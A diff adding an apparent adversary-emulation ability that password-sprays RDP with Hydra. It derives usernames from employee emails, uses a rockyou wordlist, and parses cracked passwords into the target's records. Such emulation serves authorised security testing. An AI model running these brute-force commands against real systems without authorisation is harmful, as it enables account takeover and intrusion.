@@ -1,0 +1,28 @@
+- id: 46ca03a2-ffdd-4b6b-878c-84f70d1df7d4
+  name: Execute a password spray using Hydra
+  description: Execute a password spray using Hydra - use the first part of an email address as username
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: "Brute Force: Password Spraying"
+  platforms:
+    linux:
+      sh:
+        command: |
+          potential_username=$(echo #{target.employee.email} | sed 's/@.*//');
+          hydra -l "${potential_username}" -P ./rockyou-10.txt rdp://#{target.remote.ip} -v -t 2 -b json -o output.txt > /dev/null &&
+          cat output.txt
+        parsers:
+          plugins.precomp.app.parsers.hydra:
+            - source: target.employee.password
+              edge: has_password
+              target: target.employee.username
+        timeout: 300
+        payloads:
+          - rockyou-10.txt
+        cleanup: "rm output.txt"
+  requirements:
+    - plugins.precomp.app.requirements.has_rdp:
+        - source: target.remote.port
+          edge: has_open_port
+          target: target.remote.ip
